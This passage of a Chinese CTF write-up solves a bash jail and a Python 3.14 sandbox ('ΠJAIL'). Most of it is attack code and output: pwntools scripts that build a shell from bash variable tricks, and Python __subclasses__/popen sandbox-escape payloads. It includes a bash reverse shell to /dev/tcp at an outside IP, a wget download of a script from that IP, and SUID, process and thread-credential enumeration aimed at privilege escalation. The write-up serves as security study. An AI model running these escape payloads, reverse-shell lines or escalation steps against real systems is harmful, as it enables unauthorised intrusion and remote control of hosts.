class="string">&quot;_________=$($&#123;________:$______:$___&#125;$&#123;________:$_______:$___&#125;)&quot;</span>)  <span class="comment"># -&gt; Filesystem</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now we can get s from 9 underscore variable (Filesystem) and h from 8 underscore variable (echo/dev/fd/63)</span></span><br><span class="line"><span class="comment"># sendNrecv(r,&quot;$&#123;_________:$____:$___&#125;$&#123;________:$_____:$___&#125;&quot;) # $&#123;&quot;Filesystem&quot;:4:1&#125;$&#123;&quot;echo/dev/fd/63&quot;:2:1&#125; -&gt; sh</span></span><br><span class="line">r.interactive() <span class="comment"># continue in interactive mode.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># i tried to run sh with script but ig we need to do it manually, so zust copy paste this $&#123;_________:$____:$___&#125;$&#123;________:$_____:$___&#125; </span></span><br><span class="line"><span class="comment"># and hurray ! we got a shell. </span></span><br><span class="line"></span><br><span class="line"><span class="comment">##################################### temporary copy paste #####################################</span></span><br><span class="line"><span class="comment"># make 3</span></span><br><span class="line"><span class="comment"># ______=$___$_____</span></span><br><span class="line"><span class="comment"># ______=$(($______&gt;&gt;$___))</span></span><br><span class="line"><span class="comment"># ______=$(($______&gt;&gt;$___))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># $($_&gt;($&#123;_:=&gt;(:)&#125;))</span></span><br><span class="line"><span class="comment"># $_&gt;($&#123;_:=&gt;(:)&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># echo/dev/fd/63</span></span><br></pre></td></tr></table></figure>

<h3 id="解法5"><a href="#解法5" class="headerlink" title="解法5"></a>解法5</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">targets = [<span class="number">16</span>&lt;&lt;i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line">hsteps = [</span><br><span class="line">    <span class="string">&quot;_=$((!_____))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__=$&#123;!_&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;___=$_&quot;</span>,</span><br><span class="line">    <span class="string">&quot;$&#123;___&#125;$($_)$&#123;__&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__=$&#123;__:$((!_____))&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;$&#123;___&#125;$($_)$&#123;__&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;____=$&#123;__:$((________)):$((!_____))&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;___=$&#123;___:$((!_____))&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;___=$&#123;___:$((!_____))&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_____=$&#123;___:$((________)):$((!_____))&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;______=$&#123;____&#125;$&#123;_____&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;$______&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">ssteps1 = [</span><br><span class="line">    <span class="string">&quot;__=$(())&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__=$((!$__))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;____=$(($$))&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">ssteps2 = [</span><br><span class="line">    <span class="string">&quot;_____=$&#123;!__:____:__&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;$_____&quot;</span>,</span><br><span class="line">    <span class="string">&quot;$_____$______&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#p = remote(&quot;127.0.0.1&quot;, 4444)</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    ncat --ssl minijail-1845e80796387fe2.challs.tfcctf.com 1337</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    p = remote(<span class="string">&quot;minijail-1845e80796387fe2.challs.tfcctf.com&quot;</span>, <span class="number">1337</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;caca$&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;$(($$))&quot;</span>)</span><br><span class="line">    n = p.recvuntil(<span class="string">b&quot;command not found&quot;</span>)</span><br><span class="line">    n = n.decode().split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">2</span>].strip()</span><br><span class="line">    n = <span class="built_in">int</span>(n)</span><br><span class="line">    <span class="keyword">if</span> n &gt; <span class="built_in">max</span>(targets):</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> n <span class="keyword">in</span> targets:</span><br><span class="line">        <span class="keyword">for</span> step <span class="keyword">in</span> hsteps:</span><br><span class="line">            p.recvuntil(<span class="string">b&quot;caca$&quot;</span>)</span><br><span class="line">            p.sendline(step.encode())</span><br><span class="line"></span><br><span class="line">        x = targets.index(n)</span><br><span class="line">        <span class="keyword">for</span> step <span class="keyword">in</span> ssteps1:</span><br><span class="line">            p.recvuntil(<span class="string">b&quot;caca$&quot;</span>)</span><br><span class="line">            p.sendline(step.encode())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">            p.recvuntil(<span class="string">b&quot;caca$&quot;</span>)</span><br><span class="line">            p.sendline(<span class="string">b&quot;____=$(($____&gt;&gt;$__))&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> step <span class="keyword">in</span> ssteps2:</span><br><span class="line">            p.recvuntil(<span class="string">b&quot;caca$&quot;</span>)</span><br><span class="line">            p.sendline(step.encode())</span><br><span class="line"></span><br><span class="line">        p.interactive()</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Number: <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>

<h2 id="ΠJAIL"><a href="#ΠJAIL" class="headerlink" title="ΠJAIL"></a>ΠJAIL</h2><p>jail.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> concurrent <span class="keyword">import</span> interpreters</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> ctypes, pwd</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.setgroups([])</span><br><span class="line">os.setgid(pwd.getpwnam(<span class="string">&quot;nobody&quot;</span>).pw_gid)</span><br><span class="line"></span><br><span class="line">INPUT = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_eval</span>(<span class="params">user_input</span>):</span><br><span class="line">    safe_builtins = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    blacklist = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;bytes&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(b <span class="keyword">in</span> user_input <span class="keyword">for</span> b <span class="keyword">in</span> blacklist):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Blacklisted function detected.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(<span class="built_in">ord</span>(c) &lt; <span class="number">32</span> <span class="keyword">or</span> <span class="built_in">ord</span>(c) &gt; <span class="number">126</span> <span class="keyword">for</span> c <span class="keyword">in</span> user_input):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid characters detected.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    success = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Result:&quot;</span>, <span class="built_in">eval</span>(user_input, &#123;<span class="string">&quot;__builtins__&quot;</span>: safe_builtins&#125;, &#123;<span class="string">&quot;__builtins__&quot;</span>: safe_builtins&#125;))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        success = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> success</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_user_input</span>():</span><br><span class="line">    <span class="keyword">global</span> INPUT</span><br><span class="line">    <span class="comment"># drop priv level</span></span><br><span class="line">    libc = ctypes.CDLL(<span class="literal">None</span>)</span><br><span class="line">    syscall = libc.syscall</span><br><span class="line">    nobody_uid = pwd.getpwnam(<span class="string">&quot;nobody&quot;</span>).pw_uid</span><br><span class="line">    SYS_setresuid = <span class="number">117</span></span><br><span class="line">    syscall(SYS_setresuid, nobody_uid, nobody_uid, nobody_uid)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user_interpreter = interpreters.create()</span><br><span class="line">        INPUT = <span class="built_in">input</span>(<span class="string">&quot;Enter payload: &quot;</span>)</span><br><span class="line">        user_interpreter.call(safe_eval, INPUT)</span><br><span class="line">        user_interpreter.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        t = threading.Thread(target=safe_user_input)</span><br><span class="line">        t.start()</span><br><span class="line">        t.join()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> INPUT == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Some error occured&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>Dockerfile</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">FROM python:3.14.0rc2-bookworm</span><br><span class="line"></span><br><span class="line">COPY ./jail.py /jail.py</span><br><span class="line">COPY ./flag.txt /flag.txt</span><br><span class="line"></span><br><span class="line">RUN apt update; apt  install -y socat; rm -rf /var/lib/apt/lists/*</span><br><span class="line"></span><br><span class="line">RUN chmod 700 /flag.txt</span><br><span class="line">RUN chmod 755 /jail.py</span><br><span class="line"></span><br><span class="line">EXPOSE 1337</span><br><span class="line"></span><br><span class="line">CMD [&quot;socat&quot;, &quot;TCP-LISTEN:1337,reuseaddr,fork&quot;, &quot;EXEC:python3 /jail.py&quot;]</span><br></pre></td></tr></table></figure>

<p>转载一下SU佬们的解法</p>
<p>使用 Python 3.14 的新特性 多重解释器（concurrent.interpreters），在沙箱中执行用户输入代码。过了一些关键词，以及builtins被清空，所以很多的内置函数都不能使用，而且还被降权了，类似于ssti可以getshell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[166].__init__.__globals__[&quot;popen&quot;]</span><br><span class="line"></span><br><span class="line">().__class__.__base__.__subclasses__()[166].__init__.__globals__[&quot;popen&quot;](&quot;ls / -al&quot;).read()</span><br><span class="line"></span><br><span class="line">().__class__.__base__.__subclasses__()[166].__init__.__globals__[&quot;popen&quot;](&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/156.238.233.93/4444 0&gt;&amp;1&#x27;&quot;).read()</span><br></pre></td></tr></table></figure>

<p>提权就很有意思了，常见的我们找suid位和进程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[166].__init__.__globals__[&quot;popen&quot;](&quot;find / -user root -perm -4000 -print 2&gt;/dev/null&quot;).read()</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line"></span><br><span class="line">().__class__.__base__.__subclasses__()[166].__init__.__globals__[&quot;popen&quot;](&quot;ps -ef&quot;).read()</span><br><span class="line">Result: UID          PID    PPID  C STIME TTY          TIME CMD</span><br><span class="line">root           1       0  0 03:38 ?        00:00:00 socat TCP-LISTEN:1337,reuseaddr,fork EXEC:python3 /jail.py</span><br><span class="line">root           8       1  0 03:38 ?        00:00:00 socat TCP-LISTEN:1337,reuseaddr,fork EXEC:python3 /jail.py</span><br><span class="line">root           9       8  2 03:38 ?        00:00:00 python3 /jail.py</span><br><span class="line">nobody        11       9  0 03:38 ?        00:00:00 /bin/sh -c ps -ef</span><br><span class="line">nobody        12      11  0 03:38 ?        00:00:00 ps -ef</span><br></pre></td></tr></table></figure>

<p>并没发现什么，由于是在python里面降权，想到同一进程不同线程的权限问题，写个检测脚本</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="comment"># file: thread_cred_audit.sh</span></span><br><span class="line"><span class="comment"># 用法：</span></span><br><span class="line"><span class="comment">#   1) 指定PID:   ./thread_cred_audit.sh 1234</span></span><br><span class="line"><span class="comment">#   2) 指定模式:   ./thread_cred_audit.sh &quot;python3 .*jail\.py&quot;</span></span><br><span class="line"><span class="comment">#   3) 默认尝试:   自动搜索 &quot;python3 .*jail.py&quot;</span></span><br><span class="line"><span class="built_in">set</span> -euo pipefail</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">cyan</span></span>()  &#123; <span class="built_in">printf</span> <span class="string">&quot;\033[36m%s\033[0m\n&quot;</span> <span class="string">&quot;$*&quot;</span>; &#125;</span><br><span class="line"><span class="function"><span class="title">yellow</span></span>()&#123; <span class="built_in">printf</span> <span class="string">&quot;\033[33m%s\033[0m\n&quot;</span> <span class="string">&quot;$*&quot;</span>; &#125;</span><br><span class="line"><span class="function"><span class="title">red</span></span>()   &#123; <span class="built_in">printf</span> <span class="string">&quot;\033[31m%s\033[0m\n&quot;</span> <span class="string">&quot;$*&quot;</span>; &#125;</span><br><span class="line"><span class="function"><span class="title">bold</span></span>()  &#123; <span class="built_in">printf</span> <span class="string">&quot;\033[1m%s\033[0m\n&quot;</span>   <span class="string">&quot;$*&quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">pick_pid</span></span>() &#123;</span><br><span class="line">  <span class="built_in">local</span> arg=<span class="string">&quot;<span class="variable">$&#123;1:-&#125;</span>&quot;</span></span><br><span class="line">  <span class="built_in">local</span> pid=<span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">if</span> [[ -n <span class="string">&quot;<span class="variable">$arg</span>&quot;</span> &amp;&amp; <span class="string">&quot;<span class="variable">$arg</span>&quot;</span> =~ ^[0-9]+$ &amp;&amp; -e <span class="string">&quot;/proc/<span class="variable">$arg</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    pid=<span class="string">&quot;<span class="variable">$arg</span>&quot;</span></span><br><span class="line">  <span class="keyword">elif</span> [[ -n <span class="string">&quot;<span class="variable">$arg</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># 通过模式找</span></span><br><span class="line">    <span class="built_in">local</span> line</span><br><span class="line">    line=<span class="string">&quot;<span class="subst">$(pgrep -af <span class="string">&quot;<span class="variable">$arg</span>&quot;</span> | head -n1 || true)</span>&quot;</span></span><br><span class="line">    [[ -n <span class="string">&quot;<span class="variable">$line</span>&quot;</span> ]] &amp;&amp; pid=<span class="string">&quot;<span class="subst">$(awk &#x27;&#123;print $1&#125;&#x27; &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$line</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment"># 默认找 jail.py</span></span><br><span class="line">    <span class="built_in">local</span> line</span><br><span class="line">    line=<span class="string">&quot;<span class="subst">$(pgrep -af &#x27;python3 .*jail\.py&#x27; | head -n1 || true)</span>&quot;</span></span><br><span class="line">    [[ -n <span class="string">&quot;<span class="variable">$line</span>&quot;</span> ]] &amp;&amp; pid=<span class="string">&quot;<span class="subst">$(awk &#x27;&#123;print $1&#125;&#x27; &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$line</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  [[ -z <span class="string">&quot;<span class="variable">$pid</span>&quot;</span> ]] &amp;&amp; &#123; red <span class="string">&quot;未找到目标进程。请传入 PID 或匹配模式。&quot;</span>; <span class="built_in">exit</span> 1; &#125;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$pid</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pid=<span class="string">&quot;<span class="subst">$(pick_pid <span class="string">&quot;<span class="variable">$&#123;1:-&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">[[ -r <span class="string">&quot;/proc/<span class="variable">$pid</span>/status&quot;</span> ]] || &#123; red <span class="string">&quot;无权读取 /proc/<span class="variable">$pid</span>/status（可能被 hidepid 或权限限制）&quot;</span>; <span class="built_in">exit</span> 1; &#125;</span><br><span class="line"></span><br><span class="line">bold <span class="string">&quot;== 目标进程：PID <span class="variable">$pid</span> ==&quot;</span></span><br><span class="line">name=$(awk <span class="string">&#x27;/^Name:/&#123;print $2&#125;&#x27;</span> /proc/<span class="variable">$pid</span>/status)</span><br><span class="line">uidline=$(awk <span class="string">&#x27;/^Uid:/&#123;print $2,$3,$4,$5&#125;&#x27;</span> /proc/<span class="variable">$pid</span>/status)</span><br><span class="line">gidline=$(awk <span class="string">&#x27;/^Gid:/&#123;print $2,$3,$4,$5&#125;&#x27;</span> /proc/<span class="variable">$pid</span>/status)</span><br><span class="line">threads=$(awk <span class="string">&#x27;/^Threads:/&#123;print $2&#125;&#x27;</span> /proc/<span class="variable">$pid</span>/status)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Name: <span class="variable">$name</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Uid (R/E/S/FS): <span class="variable">$uidline</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Gid (R/E/S/FS): <span class="variable">$gidline</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Threads: <span class="variable">$threads</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line">bold <span class="string">&quot;== 线程凭据一览 ==&quot;</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-8s %-12s %-12s %-8s %-s\n&quot;</span> <span class="string">&quot;TID&quot;</span> <span class="string">&quot;Uid(R/E/S)&quot;</span> <span class="string">&quot;Gid(R/E/S)&quot;</span> <span class="string">&quot;State&quot;</span> <span class="string">&quot;Comm&quot;</span></span><br><span class="line"><span class="built_in">declare</span> -A seen_euids=()</span><br><span class="line"><span class="keyword">while</span> IFS= <span class="built_in">read</span> -r d; <span class="keyword">do</span></span><br><span class="line">  tid=<span class="string">&quot;<span class="variable">$&#123;d##*/&#125;</span>&quot;</span></span><br><span class="line">  st=<span class="string">&quot;/proc/<span class="variable">$pid</span>/task/<span class="variable">$tid</span>/status&quot;</span></span><br><span class="line">  [[ -r <span class="string">&quot;<span class="variable">$st</span>&quot;</span> ]] || <span class="built_in">continue</span></span><br><span class="line">  <span class="built_in">read</span> ruid euid suid fsuid &lt; &lt;(awk <span class="string">&#x27;/^Uid:/&#123;print $2,$3,$4,$5&#125;&#x27;</span> <span class="string">&quot;<span class="variable">$st</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">read</span> rgid egid sgid fsgid &lt; &lt;(awk <span class="string">&#x27;/^Gid:/&#123;print $2,$3,$4,$5&#125;&#x27;</span> <span class="string">&quot;<span class="variable">$st</span>&quot;</span>)</span><br><span class="line">  state=$(awk -F<span class="string">&#x27;\t&#x27;</span> <span class="string">&#x27;/^State:/&#123;print $2&#125;&#x27;</span> <span class="string">&quot;<span class="variable">$st</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">comm</span>=$(awk -F<span class="string">&#x27;\t&#x27;</span> <span class="string">&#x27;/^Name:/&#123;print $2&#125;&#x27;</span> <span class="string">&quot;<span class="variable">$st</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">printf</span> <span class="string">&quot;%-8s %-12s %-12s %-8s %-s\n&quot;</span> <span class="string">&quot;<span class="variable">$tid</span>&quot;</span> <span class="string">&quot;<span class="variable">$ruid</span>/<span class="variable">$euid</span>/<span class="variable">$suid</span>&quot;</span> <span class="string">&quot;<span class="variable">$rgid</span>/<span class="variable">$egid</span>/<span class="variable">$sgid</span>&quot;</span> <span class="string">&quot;<span class="variable">$state</span>&quot;</span> <span class="string">&quot;<span class="variable">$comm</span>&quot;</span></span><br><span class="line">  seen_euids[<span class="string">&quot;<span class="variable">$euid</span>&quot;</span>]=1</span><br><span class="line"><span class="keyword">done</span> &lt; &lt;(<span class="built_in">ls</span> -1 /proc/<span class="variable">$pid</span>/task)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="keyword">if</span> (( <span class="variable">$&#123;#seen_euids[@]&#125;</span> &gt; <span class="number">1</span> )); <span class="keyword">then</span></span><br><span class="line">  red <span class="string">&quot;⚠ 检测到不同的 EUID 存在于同一进程的不同线程中（线程级降权/不一致）——此为题目核心风险点。&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  yellow <span class="string">&quot;未观察到 EUID 差异。但注意：竞态窗口仍可能瞬时存在，单次快照不代表绝对安全。&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>靶机出网，传上去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">wget http://156.238.233.93:9999/1.sh</span><br><span class="line"></span><br><span class="line">nobody@b46f2ce4e8f7:/tmp$ pgrep -af &#x27;python3 .*jail\.py&#x27;</span><br><span class="line">pgrep -af &#x27;python3 .*jail\.py&#x27;</span><br><span class="line">1 socat TCP-LISTEN:1337,reuseaddr,fork EXEC:python3 /jail.py</span><br><span class="line">521 socat TCP-LISTEN:1337,reuseaddr,fork EXEC:python3 /jail.py</span><br><span class="line">522 python3 /jail.py</span><br><span class="line">nobody@b46f2ce4e8f7:/tmp$ ./1.sh 522</span><br><span class="line">./1.sh 522</span><br><span class="line">== 目标进程：PID 522 ==</span><br><span class="line">Name: python3</span><br><span class="line">Uid (R/E/S/FS): 0 0 0 0</span><br><span class="line">Gid (R/E/S/FS): 65534 65534 65534 65534</span><br><span class="line">Threads: 2</span><br><span class="line"></span><br><span class="line">== 线程凭据一览 ==</span><br><span class="line">TID      Uid(R/E/S)   Gid(R/E/S)   State    Comm</span><br><span class="line">522      0/0/0        65534/65534/65534 S (sleeping) python3</span><br><span class="line">523      65534/65534/65534 65534/65534/65534 S (sleeping) Thread-1 (safe_</span><br></pre></td></tr></table></figure>

<p>同一进程不同线程用shellcode打</p>
<p>最终payload</p>
